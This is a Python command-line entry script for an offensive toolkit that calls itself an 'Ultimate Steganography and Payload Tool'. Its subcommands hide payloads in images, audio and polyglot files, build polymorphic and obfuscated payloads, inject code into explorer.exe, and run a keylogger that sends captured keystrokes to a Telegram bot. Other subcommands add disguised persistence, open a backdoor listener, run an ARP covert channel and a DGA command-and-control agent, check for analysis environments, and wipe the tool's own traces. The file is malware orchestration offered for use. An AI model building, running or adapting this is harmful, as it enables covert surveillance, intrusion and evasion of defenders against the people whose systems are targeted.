import argparse
import logging
import sys
import json
import threading
import os
from modules.steganography import encode_image, decode_image, detect_stego
from modules.payload import generate_payload
from modules.network import send_to_server, send_to_telegram
from modules.backdoor import backdoor_listener
from modules.audio_steganography import encode_audio, decode_audio
from modules.polyglot import create_polyglot
from modules.keylogger import start_keylogger
from modules.system import add_persistence, mimic_system_tool, self_delete
from modules.scanner import intelligent_scan
from modules.anti_analysis import run_anti_analysis_checks
from modules.discovery import discover_files
from modules.wizard import encode_wizard
from modules.covert_channel import send_arp_covert, listen_arp_covert
from modules.polymorphic_engine import create_polymorphic_payload, generate_encryption_stub
from modules.anti_forensics import scorched_earth
from modules.evasion import inject_code, hide_in_filesystem, find_process_by_name
from modules.social_engineering import clone_website, create_macro_doc, send_email
from modules.backdoor import dga_agent

def load_config(config_path='config.json'):
    """Load configuration from a JSON file."""
    try:
        with open(config_path, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        logging.warning(f"Configuration file not found at {config_path}. Using default or command-line values.")
        return {}
    except json.JSONDecodeError:
        logging.error(f"Invalid JSON in configuration file: {config_path}")
        return {}

def main():
    config = load_config()

    parser = argparse.ArgumentParser(
        description="Ultimate Steganography and Payload Tool",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument('--verbose', '-v', action='store_true', help='Enable verbose logging')
    parser.add_argument('--no-anti-analysis', action='store_true', help='Disable anti-analysis checks')
    subparsers = parser.add_subparsers(dest="command", required=True)

    # Image Steganography
    encode_parser = subparsers.add_parser("encode-image", help="Embed payload into an image")
    encode_parser.add_argument("--input-image", required=True, help="Input image path")
    encode_parser.add_argument("--payload", required=True, help="Text or file path for the payload")
    encode_parser.add_argument("--output-image", required=True, help="Output image path")
    encode_parser.add_argument("--file", action="store_true", help="Indicates that the payload is a file path")
    encode_parser.add_argument("--encrypt", action="store_true", help="Encrypt the payload")
    encode_parser.add_argument("--encrypt-method", default="fernet", choices=["fernet", "aes"], help="Encryption method to use")
    encode_parser.add_argument("--key", help="Base64 encoded key for encryption")
    encode_parser.add_argument("--compress", action="store_true", help="Compress the payload")
    encode_parser.add_argument("--adaptive", action="store_true", help="Use adaptive embedding in edge regions")
    encode_parser.add_argument("--seed", help="Seed for random pixel ordering")
    encode_parser.add_argument("--bits", type=int, default=1, help="Number of bits per color channel to use")
    encode_parser.add_argument("--opap", action="store_true", help="Use Optimal Pixel Adjustment Process (OPAP)")
    encode_parser.add_argument("--morph", action="store_true", help="Morph the payload before encoding")
    encode_parser.add_argument("--polymorphic", action="store_true", help="Generate a polymorphic payload")
    encode_parser.add_argument("--evasive", action="store_true", help="Use IMODE evasion techniques")
    encode_parser.add_argument("--ekp", metavar="PROFILE_JSON", help="Enable Environment-Keyed Payload using the specified profile")

    decode_parser = subparsers.add_parser("decode-image", help="Extract payload from an image")
    decode_parser.add_argument("--input-image", required=True, help="Input image path")
    decode_parser.add_argument("--key", help="Base64 encoded key for decryption")
    decode_parser.add_argument("--encrypt-method", default="fernet", choices=["fernet", "aes"], help="Decryption method to use")
    decode_parser.add_argument("--compress", action="store_true", help="Decompress the payload")
    decode_parser.add_argument("--output-file", help="Path to save the extracted payload")
    decode_parser.add_argument("--adaptive", action="store_true", help="Use adaptive extraction from edge regions")
    decode_parser.add_argument("--seed", help="Seed for random pixel ordering")
    decode_parser.add_argument("--bits", type=int, default=1, help="Number of bits per color channel used")

    # Audio Steganography
    encode_audio_parser = subparsers.add_parser("encode-audio", help="Embed payload into an audio file")
    encode_audio_parser.add_argument("--input-audio", required=True, help="Input audio path (WAV)")
    encode_audio_parser.add_argument("--payload", required=True, help="Payload string")
    encode_audio_parser.add_argument("--output-audio", required=True, help="Output audio path")

    decode_audio_parser = subparsers.add_parser("decode-audio", help="Extract payload from an audio file")
    decode_audio_parser.add_argument("--input-audio", required=True, help="Input audio path (WAV)")

    # Polyglot
    polyglot_parser = subparsers.add_parser("create-polyglot", help="Create a polyglot file")
    polyglot_parser.add_argument("--image", required=True, help="Path to the image file")
    polyglot_parser.add_argument("--zip", required=True, help="Path to the ZIP file")
    polyglot_parser.add_argument("--output", required=True, help="Output path for the polyglot file")

    # Payload generation
    gen_payload_parser = subparsers.add_parser("gen-payload", help="Generate a payload")
    gen_payload_parser.add_argument("--type", default='random', choices=['random', 'custom'], help="Type of payload")
    gen_payload_parser.add_argument("--length", type=int, default=100, help="Length of the random payload")
    gen_payload_parser.add_argument("--data", help="Custom data for the payload")
    gen_payload_parser.add_argument("--obfuscate", action="store_true", help="Obfuscate the payload")
    gen_payload_parser.add_argument("--obfuscate-method", default='base64', choices=['base64', 'xor'], help="Obfuscation method")
    gen_payload_parser.add_argument("--morph", action="store_true", help="Morph the payload")
    gen_payload_parser.add_argument("--polymorphic", action="store_true", help="Generate a polymorphic payload")
    gen_payload_parser.add_argument("--evasive", action="store_true", help="Use IMODE evasion techniques")
    gen_payload_parser.add_argument("--ekp", metavar="PROFILE_JSON", help="Enable Environment-Keyed Payload using the specified profile")
    gen_payload_parser.add_argument("--output-file", help="File to save the generated payload")

    # Detect command
    detect_parser = subparsers.add_parser("detect", help="Detect the presence of a hidden message in an image")
    detect_parser.add_argument("--input-image", required=True, help="Input image path")
    detect_parser.add_argument("--bits", type=int, default=1, help="Number of bits per color channel to check")

    # Keylogger
    keylogger_parser = subparsers.add_parser("keylogger", help="Start the keylogger")
    keylogger_parser.add_argument("--duration", type=int, default=300, help="Duration to run the keylogger in seconds")

    # Persistence
    persist_parser = subparsers.add_parser("persist", help="Add persistence")

    # Scanner
    scan_parser = subparsers.add_parser("scan", help="Run an intelligent scan on a subnet")
    scan_parser.add_argument("--subnet", required=True, help="Subnet to scan (e.g., 192.168.1.)")
    scan_parser.add_argument("--ports", nargs='+', type=int, help="Specific ports to scan (optional)")

    # Backdoor
    backdoor_parser = subparsers.add_parser("backdoor", help="Start the backdoor listener")
    backdoor_parser.add_argument("--port", type=int, default=5555, help="Port for the backdoor to listen on")
    backdoor_parser.add_argument("--password", required=True, help="Password for the backdoor")

    # Covert Channel
    send_arp_parser = subparsers.add_parser("send-arp", help="Send data via ARP covert channel")
    send_arp_parser.add_argument("--target-ip", required=True, help="Target IP address")
    send_arp_parser.add_argument("--payload", required=True, help="Payload to send")

    listen_arp_parser = subparsers.add_parser("listen-arp", help="Listen for data from ARP covert channel")
    listen_arp_parser.add_argument("--timeout", type=int, default=60, help="Timeout in seconds")

    # Discovery
    discover_parser = subparsers.add_parser("discover", help="Discover files")
    discover_parser.add_argument("--type", required=True, choices=['image', 'audio', 'video'], help="Type of file to discover")
    discover_parser.add_argument("--path", default='.', help="Directory to search in")

    # Wizard
    wizard_parser = subparsers.add_parser("wizard", help="Run an interactive wizard")
    wizard_parser.add_argument("--mode", required=True, choices=['encode'], help="Wizard mode to run")

    # Resilience
    resilience_parser = subparsers.add_parser("resilience", help="Manage resilience features")
    resilience_parser.add_argument("--enable-guardian", action="store_true", help="Enable Guardian mode")
    resilience_parser.add_argument("--self-destruct", action="store_true", help="Activate Scorched Earth policy")

    # DGA Agent
    dga_parser = subparsers.add_parser("dga-agent", help="Start the DGA C2 agent")
    dga_parser.add_argument("--seed", required=True, help="The DGA seed to use")
    dga_parser.add_argument("--interval", type=int, default=3600, help="Polling interval in seconds")

    args = parser.parse_args()

    level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(level=level, format='%(asctime)s - %(levelname)s - %(message)s')

    if not args.no_anti_analysis:
        if run_anti_analysis_checks():
            logging.warning("Anti-analysis checks failed. Exiting.")
            sys.exit(0)

    tg_config = config.get("telegram", {})
    bot_token = tg_config.get("bot_token")
    chat_id = tg_config.get("chat_id")

    script_path = os.path.abspath(sys.argv[0])

    seed = int(args.seed) if hasattr(args, 'seed') and args.seed else None

    try:
        if args.command == "encode-image":
            payload_to_embed = args.payload.encode()
            if args.polymorphic:
                base_payload = payload_to_embed
                polymorphic_code = create_polymorphic_payload(base_payload.decode())
                payload_to_embed = generate_encryption_stub(polymorphic_code.encode()).encode()

            if args.evasive:
                # This is a conceptual demonstration.
                logging.info("Creating an evasive payload wrapper...")
                evasive_wrapper = f"""
import sys
from modules.evasion import hide_in_filesystem, inject_code, find_process_by_name

final_payload = {payload_to_embed}
cover_file = hide_in_filesystem(final_payload)
target_pid = find_process_by_name("explorer.exe")
if target_pid:
    inject_code(target_pid, final_payload)
"""
                payload_to_embed = evasive_wrapper.encode()

            encode_image(
                input_path=args.input_image,
                payload=payload_to_embed,
                output_path=args.output_image,
                bits_per_channel=args.bits,
                encrypt=args.encrypt,
                encrypt_method=args.encrypt_method,
                key=args.key,
                compress=args.compress,
                adaptive=args.adaptive,
                seed=seed,
                is_file=args.file,
                verbose=args.verbose,
                opap=args.opap
            )
        elif args.command == "decode-image":
            data = decode_image(
                input_path=args.input_image,
                key=args.key,
                encrypt_method=args.encrypt_method,
                compress=args.compress,
                output_file=args.output_file,
                bits_per_channel=args.bits,
                adaptive=args.adaptive,
                seed=seed,
                verbose=args.verbose
            )
            if data:
                print(f"Extracted data: {data}")

        elif args.command == "encode-audio":
            encode_audio(args.input_audio, args.payload, args.output_audio)
        elif args.command == "decode-audio":
            data = decode_audio(args.input_audio)
            if data:
                print(f"Extracted data: {data}")

        elif args.command == "create-polyglot":
            create_polyglot(args.image, args.zip, args.output)

        elif args.command == "gen-payload":
            if args.polymorphic:
                base_payload = generate_payload(
                    payload_type=args.type,
                    length=args.length,
                    data=args.data
                )
                polymorphic_code = create_polymorphic_payload(base_payload.decode(errors='ignore'))
                payload = generate_encryption_stub(polymorphic_code.encode()).encode()
            else:
                payload = generate_payload(
                    payload_type=args.type,
                    length=args.length,
                    data=args.data,
                    obfuscate=args.obfuscate,
                    obfuscate_method=args.obfuscate_method,
                    morph=args.morph
                )
            if args.output_file:
                with open(args.output_file, 'wb') as f:
                    f.write(payload)
                print(f"Payload saved to {args.output_file}")
            else:
                print("Generated Payload:", payload.decode(errors='ignore'))

        elif args.command == "detect":
            result = detect_stego(input_path=args.input_image, bits_per_channel=args.bits)
            print(result)

        elif args.command == "keylogger":
            if not bot_token or not chat_id:
                logging.error("Telegram bot token and chat ID must be configured for the keylogger.")
                sys.exit(1)
            start_keylogger(args.duration, bot_token, chat_id)

        elif args.command == "persist":
            mimic_system_tool(script_path)
            add_persistence(script_path)

        elif args.command == "scan":
            results = intelligent_scan(args.subnet, args.ports)
            for host in results:
                print(f"IP: {host['ip']}, Ports: {host['open_ports']}, Score: {host['threat_score']}")

        elif args.command == "backdoor":
            backdoor_listener(args.port, args.password)

        elif args.command == "send-arp":
            send_arp_covert(args.target_ip, args.payload.encode())

        elif args.command == "listen-arp":
            data = listen_arp_covert(args.timeout)
            if data:
                print(f"Received data: {data.decode(errors='ignore')}")

        elif args.command == "discover":
            files = discover_files(args.type, args.path)
            for f in files:
                print(f)

        elif args.command == "wizard":
            if args.mode == 'encode':
                encode_wizard()

        elif args.command == "resilience":
            if args.self_destruct:
                scorched_earth(script_path)
                # The script will be deleted, so we must exit.
                sys.exit(0)
            if args.enable_guardian:
                logging.info("Enabling Guardian mode... The guardian will run in the background.")
                # Detach the guardian process
                subprocess.Popen([sys.executable, "guardian.py", script_path], close_fds=True)

        elif args.command == "dga-agent":
            dga_agent(args.seed, args.interval)

    except Exception as e:
        logging.error(f"An error occurred: {e}", exc_info=args.verbose)
        sys.exit(1)

if __name__ == "__main__":
    main()